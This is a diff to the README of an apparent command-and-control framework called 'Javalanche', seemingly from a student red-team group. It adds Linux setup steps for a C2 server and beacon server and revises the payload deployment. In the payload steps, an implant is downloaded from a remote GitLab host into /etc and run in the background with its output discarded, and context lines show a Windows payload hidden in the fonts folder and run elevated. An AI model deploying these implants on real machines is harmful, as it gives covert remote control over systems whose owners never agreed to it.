@@ -25,15 +25,51 @@ ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508
 ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
 
 
+Linux C2 Server
+
+$ sudo apt update
+
+$ sudo apt install curl
+
+$ sudo mkdir /home/javalanche
+
+$ cd /home/javalanche
+
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
+
+$ sudo chmod +x serverSetup.sh
+
+$ sudo ./serverSetup.sh
+
+
+Linux Long Range Beacon Server
+
+$ sudo apt update
+
+$ sudo apt install curl
+
+$ sudo mkdir /home/javalanche
+
+$ cd /home/javalanche
+
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
+
+$ sudo chmod +x serverSetup.sh
+
+$ sudo ./serverSetup.sh -server Beacon
+
+
 Linux Payload
 
-bash> git clone "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
+$ sudo apt update
 
-bash> cd jms9508/Javalanche/Payloads
+$ sudo apt install curl
 
-bash> chmod +x linuxPayload.bash
+$ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
 
-bash> ./linuxPayload.bash <Beacon IP address>
+$ sudo chmod +x /etc/javalanche.sh
+
+$ sudo -b nohup /etc/javalanche.sh {IP Address of Beacon} >/dev/null 2>&1
 
 **Network Diagram:**
 ![alt text](Images/C2NetworkDiagram.drawio.png)
@@ -97,17 +133,15 @@ UML:
 ![alt text](Images/DannyJamesC2UML.drawio.png)
 
 **TODO**
-Add actual HTTP protocol instead of just tcp port 80,
-
 Add Linux Attack Chains,
 
-Add Linux Server Setup,
+Clean up Linux Server Setup output,
 
-Add Linux Usage Instructions,
+Fix linux cronjobs,
 
-Fix Linux Payload,
+Ansible Deployment,
 
-Javalanche ASCII Art,
+Change readme usage to be Ansible instructions, and move current instructions to their own file,
 
 Clear Terminal,
 
